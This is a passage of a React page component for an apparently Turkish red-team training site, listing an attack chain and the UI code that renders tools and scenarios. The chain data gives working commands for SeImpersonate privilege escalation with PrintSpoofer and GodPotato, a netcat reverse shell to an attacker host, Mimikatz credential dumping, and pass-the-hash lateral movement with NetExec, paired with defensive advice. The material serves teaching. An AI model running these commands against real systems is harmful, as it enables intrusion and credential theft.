          { step: "2", label: "Token Hakları Enum",    tool: "Windows PrivEsc",    href: "/red-team/windows-privesc",  detail: "whoami /priv → SeImpersonatePrivilege: Enabled — bu tek satır SYSTEM'e yolu açar" },
          { step: "3", label: "PrintSpoofer / GodPotato", tool: "Windows PrivEsc",href: "/red-team/windows-privesc",  detail: "PrintSpoofer64.exe -i -c cmd → SYSTEM shell | GodPotato -cmd 'cmd /c whoami' → nt authority\\system" },
          { step: "4", label: "SYSTEM Shell",          tool: "Reverse Shells",     href: "/red-team/reverse-shells",   detail: "PrintSpoofer ile SYSTEM reverse shell: PrintSpoofer64.exe -c 'nc.exe KALI 4445 -e cmd.exe'" },
          { step: "5", label: "Mimikatz Credential Dump", tool: "Windows PrivEsc",href: "/red-team/windows-privesc",  detail: "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit → cleartext parola veya NTLM hash" },
          { step: "6", label: "Lateral Movement",     tool: "NetExec",             href: "/red-team/netexec",          detail: "Dump edilen admin hash ile: netexec smb 192.168.1.0/24 -u Administrator -H HASH → Pwn3d! → pivot" },
        ],
        defense: "IIS / MSSQL'i 'Network Service' veya özel düşük yetkili hesapla çalıştır — SeImpersonate genellikle bu hesaplara verilir. Windows Server 2019+ ve en güncel patch. LSASS Protected Process Light (PPL) aktif et. Defender Credential Guard.",
      },
    ],
  },
];

const levelColor: Record<string, string> = {
  amber: "text-amber-400 bg-amber-500/10 border-amber-500/20",
  red:   "text-red-400 bg-red-500/10 border-red-500/20",
};

// Tüm senaryoları düz listeye dök (eski kodu bozmamak için)
const scenarios = scenarioCategories.flatMap((c) => c.scenarios);

// ─── Bileşen ─────────────────────────────────────────────────────────
export default function RedTeamPage() {
  const [openCats, setOpenCats] = useState<Record<string, boolean>>({
    "bilgi-toplama": true,
    "ag-kesfi": true,
  });
  const [tab, setTab] = useState<"araclar" | "senaryolar">("araclar");
  const [openScenario, setOpenScenario] = useState<string | null>(null);

  const toggle = (id: string) =>
    setOpenCats((s) => ({ ...s, [id]: !s[id] }));

  return (
    <div className="p-6 max-w-4xl mx-auto">
      <div className="flex items-center gap-3 mb-2">
        <Shield className="w-7 h-7 text-red-400" />
        <h1 className="text-2xl font-bold text-terminal-white">Red Team</h1>
      </div>
      <p className="text-terminal-comment mb-6 ml-10">
        Ofansif güvenlik araçlarını ve tekniklerini temelden ileri seviyeye öğren.
        <Link href="/metodoloji" className="ml-2 text-xs text-fuchsia-400/70 hover:text-fuchsia-300 transition-colors">
          ← Metodoloji omurgası
        </Link>
      </p>

      {/* Sekme başlıkları */}
      <div className="flex gap-1 mb-6 border-b border-surface-3">
        <button
          onClick={() => setTab("araclar")}
          className={cn("px-4 py-2 text-sm font-semibold transition-colors border-b-2 -mb-px",
            tab === "araclar"
              ? "border-red-500 text-red-300"
              : "border-transparent text-terminal-comment hover:text-terminal-white")}
        >
          <Shield className="w-3.5 h-3.5 inline mr-1.5" />Araçlar
        </button>
        <button
          onClick={() => setTab("senaryolar")}
          className={cn("px-4 py-2 text-sm font-semibold transition-colors border-b-2 -mb-px",
            tab === "senaryolar"
              ? "border-red-500 text-red-300"
              : "border-transparent text-terminal-comment hover:text-terminal-white")}
        >
          <GitBranch className="w-3.5 h-3.5 inline mr-1.5" />Saldırı Senaryoları
        </button>
      </div>

      {/* ARAÇLAR — Accordion */}
      {tab === "araclar" && (
        <div className="space-y-2">
          {toolCategories.map((cat) => {
            const isOpen = openCats[cat.id] ?? false;
            return (
              <div key={cat.id} className="border border-surface-3 rounded-lg overflow-hidden">
                <button
                  onClick={() => toggle(cat.id)}
                  className={cn("w-full flex items-center gap-3 px-4 py-3 text-left transition-colors",
                    isOpen ? "bg-red-500/5" : "hover:bg-surface-2")}
                >
                  <span className="text-base">{cat.emoji}</span>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="text-sm font-semibold text-terminal-white">{cat.category}</span>
                      <span className="text-xs font-mono text-red-400/60 bg-red-500/5 border border-red-500/15 px-1.5 py-0.5 rounded">
                        {cat.items.length} araç
                      </span>
                    </div>
                    <p className="text-xs text-terminal-comment">{cat.desc}</p>
                  </div>
                  {isOpen
                    ? <ChevronDown className="w-4 h-4 text-red-400 shrink-0" />
                    : <ChevronRight className="w-4 h-4 text-terminal-comment shrink-0" />}
                </button>
                {isOpen && (
                  <div className="border-t border-surface-3 grid sm:grid-cols-2 gap-2 p-3 bg-surface-1/50">
                    {cat.items.map((tool) => (
                      <Link key={tool.slug} href={`/red-team/${tool.slug}`} className="group">
                        <div className="module-card border border-surface-3 hover:border-red-500/40 hover:shadow-[0_0_20px_rgba(239,68,68,0.08)] transition-all">
                          <div className="flex items-start justify-between">
                            <h3 className="font-semibold text-terminal-white group-hover:text-red-300 transition-colors text-sm">
                              {tool.title}
                            </h3>
                            <ArrowRight className="w-3.5 h-3.5 text-terminal-comment group-hover:text-red-400 group-hover:translate-x-1 transition-all shrink-0" />
                          </div>
                          <p className="text-xs text-terminal-comment mt-1 leading-relaxed">{tool.desc}</p>
                          <span className="mt-2 inline-block text-xs font-mono text-red-400/70 bg-red-500/5 border border-red-500/15 px-2 py-0.5 rounded">
                            {tool.level}
                          </span>
                        </div>
                      </Link>
                    ))}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}

      {/* SALDIRI SENARYOLARI */}
      {tab === "senaryolar" && (
        <div className="space-y-6">
          <p className="text-xs text-terminal-comment">
            Tek başına araç bilmek yetmez —{" "}
            <span className="text-red-300">zincirleyen düşünce biçimi</span> seni senior yapan şeydir.
            Tüm senaryolar yalnızca yetkili pentest veya izole lab{" "}
            <span className="text-terminal-cyan">(HTB / THM / CTF)</span> içindir.
          </p>

          {scenarioCategories.map((cat) => (
            <div key={cat.id}>
              {/* Kategori başlığı */}
              <div className="flex items-center gap-2 mb-2">
                <span className="text-base">{cat.emoji}</span>
                <span className="text-xs font-semibold text-terminal-white tracking-wide uppercase">{cat.label}</span>
                <span className="text-xs font-mono text-red-400/50 bg-red-500/5 border border-red-500/10 px-1.5 py-0.5 rounded">
                  {cat.scenarios.length} senaryo
                </span>
                <div className="flex-1 h-px bg-surface-3 ml-1" />
              </div>

              <div className="space-y-2">
                {cat.scenarios.map((s) => {
                  const isOpen = openScenario === s.id;
                  return (
                    <div key={s.id} className="border border-surface-3 rounded-lg overflow-hidden">
                      <button
                        onClick={() => setOpenScenario(isOpen ? null : s.id)}
                        className={cn("w-full flex items-center gap-3 px-4 py-3 text-left transition-colors",
                          isOpen ? "bg-red-500/5" : "hover:bg-surface-2")}
                      >
                        <Crosshair className={cn("w-4 h-4 shrink-0", isOpen ? "text-red-400" : "text-terminal-comment")} />
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 flex-wrap mb-0.5">
                            <span className="text-sm font-semibold text-terminal-white">{s.title}</span>
                            <span className={cn("text-xs font-mono px-1.5 py-0.5 rounded border", levelColor[s.diffColor])}>
                              {s.difficulty}
                            </span>
                          </div>
                          <p className="text-xs text-terminal-comment">{s.target} — {s.desc}</p>
                        </div>
                        {isOpen
                          ? <ChevronDown className="w-4 h-4 text-red-400 shrink-0" />
                          : <ChevronRight className="w-4 h-4 text-terminal-comment shrink-0" />}
                      </button>

                      {isOpen && (
                        <div className="border-t border-surface-3 p-4 space-y-3 bg-surface-1/50">
                          <div className="space-y-2">
                            {s.chain.map((c, i) => (
                              <div key={c.step} className="flex gap-3">
                                <div className="flex flex-col items-center">
                                  <div className="w-6 h-6 rounded-full bg-red-500/10 border border-red-500/30 flex items-center justify-center text-xs font-mono text-red-400 shrink-0">
                                    {c.step}
                                  </div>
                                  {i < s.chain.length - 1 && (
                                    <div className="w-px flex-1 bg-red-500/10 mt-1" />
                                  )}
                                </div>
                                <div className="pb-3 min-w-0 flex-1">
                                  <div className="flex items-center gap-2 flex-wrap mb-0.5">
                                    <span className="text-sm font-semibold text-terminal-white">{c.label}</span>
                                    <Link
                                      href={c.href}
                                      className="text-xs font-mono text-red-400 bg-red-500/5 border border-red-500/20 px-1.5 py-0.5 rounded hover:bg-red-500/15 transition-colors"
                                    >
                                      {c.tool} →
                                    </Link>
                                  </div>
                                  <p className="text-xs text-terminal-comment font-mono leading-relaxed">{c.detail}</p>
                                </div>
                              </div>
                            ))}
                          </div>
                          <div className="rounded-md border border-blue-500/20 bg-blue-500/5 px-3 py-2">
                            <p className="text-xs text-blue-300/80">
                              <span className="font-semibold text-blue-300">🛡 Savunma: </span>{s.defense}
                            </p>
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
